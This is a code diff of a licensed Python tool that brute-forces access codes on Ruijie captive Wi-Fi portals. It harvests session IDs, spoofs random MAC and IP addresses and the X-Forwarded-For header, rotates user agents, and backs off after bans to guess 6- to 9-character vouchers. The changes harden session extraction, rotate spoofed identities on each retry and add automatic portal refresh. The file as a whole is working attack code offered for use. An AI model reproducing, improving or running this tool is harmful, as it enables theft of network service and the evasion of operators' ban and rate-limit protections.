@@ -1,13 +1,13 @@
 import os, time, random, string, json, asyncio, socket, threading, re, sys
 import urllib3, requests, aiohttp
 from collections import deque
-from urllib.parse import urlparse, parse_qs, quote, unquote, urljoin
+from urllib.parse import urlparse, parse_qs, quote, unquote, urljoin, urlencode
 from rich.console import Console, Group
 from rich.text import Text
 from rich.prompt import Prompt
 from rich.live import Live
 from rich.panel import Panel
-from rich.box import ROUNDED, HEAVY
+from rich.box import ROUNDED
 from rich.align import Align
 
 try:
@@ -154,7 +154,8 @@ def _clean_portal_url(u):
         q = parse_qs(pu.query, keep_blank_values=True)
         q.pop("sign", None)
         q.pop("timestamp", None)
-        new_q = "&".join(f"{k}={quote(str(v[0]))}" for k, v in q.items() if v)
+        flat = {k: v[0] for k, v in q.items() if v and v[0] != ""}
+        new_q = urlencode(flat)
         if new_q:
             return f"{pu.scheme}://{pu.netloc}{pu.path}?{new_q}"
         return f"{pu.scheme}://{pu.netloc}{pu.path}"
@@ -185,7 +186,6 @@ def detect_and_capture():
                 )
                 for u in candidates:
                     if _extract_portal_from_url(u):
-                        console.print("[green][+] Portal captured[/green]")
                         return _clean_portal_url(u)
             except Exception:
                 pass
@@ -236,6 +236,8 @@ def build_gw_params(portal_url):
             p["_path"] = RUIJIE_WIFIDOGAUTH
         else:
             p["_path"] = RUIJIE_WIFIDOG
+        p["_orig_sign"] = q.get("sign", [None])[0]
+        p["_orig_ts"] = q.get("timestamp", [None])[0]
         p.pop("sign", None)
         p.pop("timestamp", None)
         if p.get("gw_address"):
@@ -248,9 +250,9 @@ def build_gw_params(portal_url):
 
 
 SESSION_PATTERNS = [
-    r"[?&](?:sessionId|session_id|sid|token)=([A-Za-z0-9_\-=+/]{10,})",
-    r'["\']?(?:sessionId|session_id|sid|token)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-=+/]{10,})["\']',
-    r'"session"\s*:\s*"([A-Za-z0-9_\-=+/]{10,})"',
+    r"[?&](?:sessionId|session_id|sid|token|authSessionId|ticket)=([A-Za-z0-9_\-=+/]{8,})",
+    r'["\']?(?:sessionId|session_id|sid|token|authSessionId|ticket)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-=+/]{8,})["\']',
+    r'"session"\s*:\s*"([A-Za-z0-9_\-=+/]{8,})"',
 ]
 SIGN_PATTERNS = [
     r"[?&]sign=([A-Za-z0-9_\-=+/]+)",
@@ -323,6 +325,22 @@ async def _try_fetch_fresh(session, url, headers, base):
             final_url = str(r.url)
             sid, sign, ts = _from_url(final_url)
 
+            if not sid and body:
+                try:
+                    j = json.loads(body)
+                    if isinstance(j, dict):
+                        for cand in (
+                            j.get("sessionId"),
+                            j.get("_sessionId"),
+                            j.get("data", {}).get("sessionId") if isinstance(j.get("data"), dict) else None,
+                            j.get("result", {}).get("sessionId") if isinstance(j.get("result"), dict) else None,
+                        ):
+                            if isinstance(cand, str) and len(cand.strip()) >= 6:
+                                sid = cand.strip()
+                                break
+                except Exception:
+                    pass
+
             if not sid and r.history:
                 for h in reversed(r.history):
                     loc = h.headers.get("Location", "") or str(h.url)
@@ -365,7 +383,7 @@ async def _try_fetch_fresh(session, url, headers, base):
                     cookies = "; ".join(f"{c.key}={c.value}" for c in session.cookie_jar)
                     if cookies:
                         m = re.search(
-                            r"(?:sessionId|session_id|sid|token)=([A-Za-z0-9_\-=+/]{10,})",
+                            r"(?:sessionId|session_id|sid|token|_sessionId)=([A-Za-z0-9_\-=+/]{6,})",
                             cookies, re.I,
                         )
                         if m:
@@ -373,7 +391,7 @@ async def _try_fetch_fresh(session, url, headers, base):
                 except Exception:
                     pass
 
-            if sid and len(sid) >= 8:
+            if sid and len(sid) >= 6:
                 return ("OK", sid, sign, ts, final_url)
             return ("NOSID", None, None, None, final_url)
     except asyncio.TimeoutError:
@@ -384,7 +402,7 @@ async def _try_fetch_fresh(session, url, headers, base):
         return ("ERR", None, None, None, None)
 
 
-async def fetch_real_session(session, gw_params, mac, ip, retries=4):
+async def fetch_real_session(session, gw_params, mac, ip, retries=6):
     base = gw_params.get("_base") or RUIJIE_BASE
     if "portal-mm" in base:
         base = RUIJIE_MM_BASE
@@ -392,10 +410,10 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
     base_full = base + path
     original_url = gw_params.get("_original_url")
 
-    use_mac = (gw_params.get("mac") or mac or generate_random_mac()).lower()
-    use_ip = gw_params.get("ip") or ip or generate_random_ip()
-
     for attempt in range(retries):
+        use_mac = (gw_params.get("mac") or mac or generate_random_mac()).lower()
+        use_ip = gw_params.get("ip") or ip or generate_random_ip()
+
         headers = {
             "User-Agent": random.choice(UA_POOL),
             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
@@ -407,8 +425,7 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
         }
 
         if original_url and attempt == 0:
-            clean_url = re.sub(r"([?&])(sign|timestamp)=[^&]*", r"\1", original_url)
-            clean_url = re.sub(r"[?&]+$", "", clean_url)
+            clean_url = _clean_portal_url(original_url)
             st, sid, sign, ts, final_u = await _try_fetch_fresh(
                 session, clean_url, headers, base
             )
@@ -420,24 +437,22 @@ async def fetch_real_session(session, gw_params, mac, ip, retries=4):
         p["stage"] = "portal"
         p["mac"] = use_mac
         p["ip"] = use_ip
-        p["url"] = base
-        p["timestamp"] = str(int(time.time()))
+        p["url"] = p.get("url") or "http://connectivitycheck.gstatic.com/generate_204"
+        p["timestamp"] = str(int(time.time() * 1000))
         p.pop("sign", None)
         p.setdefault("v", "2")
 
-        qs = "&".join(f"{k}={quote(str(v), safe='\\\\')}" for k, v in p.items())
+        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in p.items())
         url = f"{base_full}?{qs}"
 
         st, sid, sign, ts, final_u = await _try_fetch_fresh(session, url, headers, base)
         if st == "OK" and sid:
             return ("REAL", _sess_dict(sid, sign, ts, final_u, base, use_mac, use_ip))
 
-        use_mac = generate_random_mac().lower()
-        use_ip = generate_random_ip()
         if st == "BAN":
-            await asyncio.sleep(random.uniform(0.6, 1.4))
+            await asyncio.sleep(random.uniform(0.8, 1.8))
         elif attempt < retries - 1:
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.4)
 
     return ("FAIL", "no-session")
 async def test_code(session, sess, code, mac, ip):
@@ -464,7 +479,7 @@ async def test_code(session, sess, code, mac, ip):
         "X-Forwarded-For": use_ip,
         "Accept": "application/json, text/plain, */*",
         "Origin": base_url,
-        "Cookie": f"sessionId={sid}",
+        "Cookie": f"sessionId={sid}; _sessionId={sid}",
         "Connection": "keep-alive",
     }
     payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}
@@ -561,65 +576,65 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
         progress = min(100.0, (tested / total) * 100) if total else 0.0
 
         header = Panel(
-            Align.center(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_cyan")),
-            border_style="bright_cyan", box=HEAVY, height=3,
+            Align.center(Text(f"⚡ {APP_NAME} ⚡", style="dim white")),
+            border_style="dim white", box=ROUNDED, height=3,
         )
 
         st = Table.grid(expand=True, padding=(0, 1))
         for _ in range(4):
-            st.add_column(style="bold white", justify="center")
-        st_style = "bold red" if any(x in str(status).upper() for x in (
+            st.add_column(style="dim white", justify="center")
+        st_style = "dim red" if any(x in str(status).upper() for x in (
             "ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "NO", "CANCEL"
-        )) else "bold green"
+        )) else "dim green"
         st.add_row(
-            Text("🚀 speed", style="bright_cyan"),
-            Text("📊 tested", style="bright_cyan"),
-            Text("📡 status", style="bright_cyan"),
-            Text("⏱ uptime", style="bright_cyan"),
+            Text("🚀 speed", style="dim white"),
+            Text("📊 tested", style="dim white"),
+            Text("📡 status", style="dim white"),
+            Text("⏱ uptime", style="dim white"),
         )
         st.add_row(
-            Text(f"⚡ {int(speed)}", style="bold white"),
-            Text(f"🔢 {tested}", style="bold white"),
+            Text(f"⚡ {int(speed)}", style="dim white"),
+            Text(f"🔢 {tested}", style="dim white"),
             Text(f"{status}", style=st_style),
-            Text(f"🕒 {elapsed}", style="bold white"),
+            Text(f"🕒 {elapsed}", style="dim white"),
         )
-        st_panel = Panel(st, border_style="bright_magenta", box=HEAVY, height=4)
+        st_panel = Panel(st, border_style="dim white", box=ROUNDED, height=4)
 
         cur_disp = cur_code if cur_code else "------"
         code_panel = Panel(
             Align.center(Text(
                 f"🎯 {cur_disp}  ·  mode {mode_str} ({scan_method.upper()})",
-                style="bold bright_yellow",
+                style="dim white",
             )),
-            border_style="bright_yellow", box=HEAVY, height=3,
+            border_style="dim white", box=ROUNDED, height=3,
         )
 
         sess_style = {
-            "REAL": "bold green", "EXPIRED": "bold red",
-            "BANNED": "bold red", "HIT": "bold bright_green",
-            "FAIL": "bold yellow", "FETCH": "bold cyan",
-        }.get(sess_stat, "bold cyan")
+            "REAL": "dim green", "EXPIRED": "dim red",
+            "BANNED": "dim red", "HIT": "dim green",
+            "FAIL": "dim yellow", "FETCH": "dim white",
+        }.get(sess_stat, "dim white")
         sess_txt = (
             f"{sess_stat} ({(sess_id or '')[:8]})"
             if sess_id and sess_id != "--------" else sess_stat
         )
 
         info = Text()
-        info.append("  🔐 Session  → ", style="bold white")
+        info.append("  🔐 Session  → ", style="dim white")
         info.append(f"{sess_txt}   ", style=sess_style)
-        info.append(f"[pool {sess_pool}/{SESSION_POOL_SIZE}]\n", style="bold cyan")
-        info.append("  📈 Progress → ", style="bold white")
-        info.append(f"{progress:.2f}% ({tested:,}/{total:,})\n", style="bold bright_cyan")
-        info.append("  🖥 MAC/IP   → ", style="bold white")
-        info.append(f"{mac}  /  {ip}", style="bold white")
-        info_panel = Panel(info, border_style="bright_blue", box=HEAVY, height=5)
+        info.append(f"[pool {sess_pool}/{SESSION_POOL_SIZE}]\n", style="dim white")
+        info.append("  📈 Progress → ", style="dim white")
+        info.append(f"{progress:.2f}% ({tested:,}/{total:,})\n", style="dim white")
+        info.append("  🖥 MAC/IP   → ", style="dim white")
+        info.append(f"{mac}  /  {ip}", style="dim white")
+        info_panel = Panel(info, border_style="dim white", box=ROUNDED, height=5)
 
-        vt = Table(show_header=True, header_style="bold bright_white",
-                   expand=True, box=HEAVY, border_style="bright_green")
-        vt.add_column("🔢", style="bold cyan", justify="center", width=5)
-        vt.add_column("🎟 VALID", style="bold bright_green", justify="center")
-        vt.add_column("⏳ Expiry", style="bold green", justify="center")
-        vt.add_column("🕒 Time", style="bold yellow", justify="center")
+        vt = Table(show_header=True, header_style="dim white",
+                   expand=True, box=ROUNDED, border_style="dim white")
+        vt.add_column("🔢", style="dim white", justify="center", width=5)
+        vt.add_column("🎟 VALID", style="dim green", justify="center")
+        vt.add_column("⏳ Expiry", style="dim white", justify="center")
+        vt.add_column("🕒 Time", style="dim white", justify="center")
 
         recent = list(hits)[-6:]
         if recent:
@@ -633,13 +648,13 @@ def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
             vt.add_row("1", "—", "—", "—")
 
         foot = Panel(
-            Align.center(Text(f"✨ {APP_TAG} ✨", style="bold bright_yellow")),
-            border_style="bright_red", box=HEAVY, height=3,
+            Align.center(Text(f"✨ {APP_TAG} ✨", style="dim white")),
+            border_style="dim white", box=ROUNDED, height=3,
         )
 
         return Group(header, st_panel, code_panel, info_panel, vt, foot)
     except Exception:
-        return Text("⏳ Loading...", style="bold cyan")
+        return Text("⏳ Loading...", style="dim white")
 
 
 async def scan_loop_async(mode, length, scan_method, gw_params):
@@ -667,6 +682,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
     pool_lock = asyncio.Lock()
     fetch_inflight = 0
     pending_codes = deque()
+    consecutive_no_sess = 0
 
     sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
     conn = aiohttp.TCPConnector(limit=200, ssl=False, force_close=False,
@@ -685,7 +701,13 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
         try:
             tag, payload = await fetch_real_session(session, gw_params, mac, ip)
             if tag == "REAL" and isinstance(payload, dict):
+                new_sid = payload.get("sessionId")
                 async with pool_lock:
+                    if new_sid:
+                        pool[:] = [
+                            x for x in pool
+                            if x.get("sess", {}).get("sessionId") != new_sid
+                        ]
                     pool.append({"sess": payload, "born": time.time(), "used": 0})
                 return True
         except Exception:
@@ -717,10 +739,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
         for _ in range(50):
             async with pool_lock:
                 if pool:
-                    entry = pool[0]
-                    entry["used"] += 1
-                    if entry["used"] >= SESSION_REUSE_MAX:
-                        pool.pop(0)
+                    entry = pool.pop(0)
                     return entry["sess"]
             await asyncio.sleep(0.1)
         return None
@@ -783,12 +802,19 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
 
                 sess = await get_sess()
                 if sess is None:
+                    consecutive_no_sess += 1
                     for c in reversed(batch):
                         pending_codes.appendleft(c)
-                    set_state(sess_stat="FAIL", status="No session — retrying")
+                    set_state(sess_stat="FETCH", status="Fetching fresh URL/session")
+                    if consecutive_no_sess >= 4:
+                        refreshed = await asyncio.to_thread(detect_and_capture)
+                        if refreshed:
+                            gw_params.update(build_gw_params(refreshed))
+                        consecutive_no_sess = 0
                     await asyncio.sleep(0.5)
                     continue
 
+                consecutive_no_sess = 0
                 set_state(sess_stat="REAL",
                           sess_id=sess.get("sessionId", "--------"),
                           status="Active")
@@ -830,7 +856,7 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         rotate = True
                         for rem in reversed(batch[idx:]):
                             pending_codes.appendleft(rem)
-                        set_state(sess_stat="EXPIRED", status="Session expired")
+                        set_state(sess_stat="EXPIRED", status="Session expired — new fetch")
                         break
                     if res == "__RATE_LIMITED__":
                         rotate = True
@@ -852,13 +878,13 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
                         except Exception:
                             pass
                         set_state(sess_stat="HIT")
-                        console.print(f"[bold bright_green]🎯 HIT → {code_val} | {plan}[/]")
+                        console.print(f"[dim green]🎯 HIT → {code_val} | {plan}[/]")
 
                 if rotate:
                     async with pool_lock:
                         if pool:
                             pool.pop(0)
-                    set_state(status="Rotating")
+                    set_state(status="Fetching fresh session")
 
                 await asyncio.sleep(0.005)
 
@@ -882,9 +908,9 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
             console.print(Panel(
                 Align.center(Text(
                     f"✅ Done · Tested {s['tested']:,} · Hits {len(hits)}",
-                    style="bold bright_green",
+                    style="dim green",
                 )),
-                border_style="bright_green", box=HEAVY,
+                border_style="dim green", box=ROUNDED,
             ))
         except Exception:
             pass
@@ -893,21 +919,21 @@ async def scan_loop_async(mode, length, scan_method, gw_params):
 def show_banner():
     clear_screen()
     console.print()
-    console.print(Text("═" * 42, style="bold bright_cyan"), justify="center")
-    console.print(Text(f"⚡ {APP_NAME} ⚡", style="bold bright_white"), justify="center")
-    console.print(Text("═" * 42, style="bold bright_cyan"), justify="center")
+    console.print(Text("═" * 42, style="dim white"), justify="center")
+    console.print(Text(f"⚡ {APP_NAME} ⚡", style="dim white"), justify="center")
+    console.print(Text("═" * 42, style="dim white"), justify="center")
     console.print()
 
 
 def ask_mode():
     while True:
         show_banner()
-        console.print("  [bright_cyan]1.[/] 🔢  Numeric   (0-9)")
-        console.print("  [bright_cyan]2.[/] 🔤  Alphabet  (a-z)")
-        console.print("  [bright_cyan]3.[/] 🔀  Mixed     (a-z0-9)")
-        console.print("  [bright_red]0.[/] ❌  Exit\n")
+        console.print("  [dim white]1.[/] 🔢  Numeric   (0-9)")
+        console.print("  [dim white]2.[/] 🔤  Alphabet  (a-z)")
+        console.print("  [dim white]3.[/] 🔀  Mixed     (a-z0-9)")
+        console.print("  [dim white]0.[/] ❌  Exit\n")
         try:
-            c = Prompt.ask("  [bright_cyan]➜[/]").strip()
+            c = Prompt.ask("  [dim white]➜[/]").strip()
         except (KeyboardInterrupt, EOFError):
             return None
         if c == "0":
@@ -920,12 +946,12 @@ def ask_length(mode):
     lengths = (6, 7, 8, 9)
     while True:
         show_banner()
-        console.print(f"  [bold white]Mode {mode.upper()} — length[/]\n")
+        console.print(f"  [dim white]Mode {mode.upper()} — length[/]\n")
         for i, L in enumerate(lengths, 1):
-            console.print(f"  [bright_cyan]{i}.[/] {L} chars")
-        console.print("  [bright_red]0.[/] ↩ Back\n")
+            console.print(f"  [dim white]{i}.[/] {L} chars")
+        console.print("  [dim white]0.[/] ↩ Back\n")
         try:
-            c = Prompt.ask("  [bright_cyan]➜[/]").strip()
+            c = Prompt.ask("  [dim white]➜[/]").strip()
         except (KeyboardInterrupt, EOFError):
             return None
         if c == "0":
@@ -937,11 +963,11 @@ def ask_length(mode):
 def ask_scan():
     while True:
         show_banner()
-        console.print("  [bright_cyan]1.[/] 🎲 Random")
-        console.print("  [bright_cyan]2.[/] 📈 Sequential\n")
-        console.print("  [bright_red]0.[/] ↩ Back\n")
+        console.print("  [dim white]1.[/] 🎲 Random")
+        console.print("  [dim white]2.[/] 📈 Sequential\n")
+        console.print("  [dim white]0.[/] ↩ Back\n")
         try:
-            c = Prompt.ask("  [bright_cyan]➜[/]").strip()
+            c = Prompt.ask("  [dim white]➜[/]").strip()
         except (KeyboardInterrupt, EOFError):
             return None
         if c == "0":
@@ -955,15 +981,14 @@ def prompt_manual_url():
         console.print(Panel(Align.center(Text(
             "📋 Portal URL paste (optional — auto fails only)\n"
             "/api/auth/wifidog?…  or  /auth/wifidogAuth/login/?…",
-            style="bold yellow",
-        )), border_style="yellow", box=ROUNDED))
-        u = Prompt.ask("  [bright_cyan]➜ URL[/]").strip()
+            style="dim white",
+        )), border_style="dim white", box=ROUNDED))
+        u = Prompt.ask("  [dim white]➜ URL[/]").strip()
     except (KeyboardInterrupt, EOFError):
         return None
     if not u or ("ruijienetworks" not in u.lower() and "wifidog" not in u.lower()):
         return None
     return _clean_portal_url(u)
-
 
 def run():
     show_banner()
@@ -971,8 +996,8 @@ def run():
     while not ok:
         clear_screen()
         console.print(Panel(Align.center(Text("🔐 License key (q=quit)",
-                                              style="bold yellow")),
-                            border_style="yellow"))
+                                              style="dim white")),
+                            border_style="dim white", box=ROUNDED))
         try:
             k = Prompt.ask("  ➜").strip()
         except (KeyboardInterrupt, EOFError):
@@ -983,21 +1008,21 @@ def run():
             continue
         ok2, m2 = activate_license(k)
         console.print(Panel(Align.center(Text(
-            m2, style="bold green" if ok2 else "bold red"
-        )), border_style="bright_green" if ok2 else "red"))
+            m2, style="dim green" if ok2 else "dim red"
+        )), border_style="dim white", box=ROUNDED))
         time.sleep(1.2)
         ok, msg = check_license()
 
     portal_url = detect_and_capture() or prompt_manual_url()
     if not portal_url:
-        console.print("[yellow]⚠ no URL — using default params[/]")
+        console.print("[dim white]⚠ no URL — using default params[/]")
     gw = build_gw_params(portal_url)
 
     console.print(f"[dim]  base : {gw.get('_base')}[/]")
     console.print(f"[dim]  path : {gw.get('_path')}[/]")
     console.print(f"[dim]  mac  : {gw.get('mac') or 'auto-rotate'}[/]")
     console.print(f"[dim]  ip   : {gw.get('ip') or 'auto-rotate'}[/]")
-    console.print(f"[green]  ✓ fresh redirect & session extractor enabled[/]")
+    console.print(f"[dim green]  ✓ auto refresh & scan loop ready[/]")
     time.sleep(1.3)
 
     while True:
@@ -1015,7 +1040,7 @@ def run():
         except KeyboardInterrupt:
             pass
         except Exception as e:
-            console.print(f"[bold red]Error: {e}[/]")
+            console.print(f"[dim red]Error: {e}[/]")
             time.sleep(1.5)
 
 
@@ -1026,10 +1051,11 @@ def main():
         pass
     finally:
         console.print()
-        console.print(Text(f"✨ {APP_TAG} ✨", style="bold bright_green"),
+        console.print(Text(f"✨ {APP_TAG} ✨", style="dim white"),
                       justify="center")
         time.sleep(1)
 
 
 if __name__ == "__main__":
     main()
+
